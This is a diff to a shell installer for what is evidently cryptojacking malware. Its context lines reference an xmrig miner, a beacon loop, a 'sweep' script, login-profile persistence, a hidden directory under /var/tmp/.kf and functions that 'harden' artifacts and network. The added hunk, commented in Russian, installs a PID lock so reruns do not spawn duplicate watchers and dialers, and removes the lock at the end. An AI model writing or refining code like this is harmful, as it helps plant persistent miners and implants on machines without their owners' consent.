@@ -29,6 +29,17 @@ done
 
 command -v kf_find_workdir >/dev/null 2>&1 || { echo "KF_FATAL: библиотеки не загружены (LIB=$LIB)" >&2; exit 1; }
 
+# один агент на хост: повторный запуск не плодит сторожей и диалеры
+_AG_PID="${KF_ROOT:-/var/tmp/.kf}/.agent.pid"
+if [ -f "$_AG_PID" ]; then
+  _old=$(cat "$_AG_PID" 2>/dev/null)
+  if [ -n "$_old" ] && [ "$_old" != "$$" ] && kill -0 "$_old" 2>/dev/null; then
+    echo "[kf] агент уже работает (pid $_old) — выход"
+    exit 0
+  fi
+fi
+mkdir -p "${KF_ROOT:-/var/tmp/.kf}" 2>/dev/null && printf '%s' "$$" > "$_AG_PID" 2>/dev/null
+
 # --- идентичность и каталоги -------------------------------------------------
 KF_SFX=$(kf_load_or_gen_sfx)
 [ -n "${KF_SFX:-}" ] || KF_SFX=$(printf '%04x' $$ 2>/dev/null || echo 0001)
@@ -255,4 +266,5 @@ kf_add_profile_persist "$D" 2>/dev/null
 [ -n "${KF_HARDEN:-}" ] && { kf_harden_artifacts 2>/dev/null; kf_harden_network 2>/dev/null; }
 
 sleep 2
+rm -f "${KF_ROOT:-/var/tmp/.kf}/.agent.pid" 2>/dev/null
 echo "KF_STATE: miner=$(kf_miner_running xmrig && echo RUN || echo NO) svc=$(alm_running "$D/svc.sh m" && echo OK || echo NO) beacon=$(alm_running "$D/loop.sh" && echo OK || echo NO) sweep=$(alm_running "$D/sweep.sh" && echo OK || echo NO) cores=$CORES threads=$THREADS nice=$NICE"
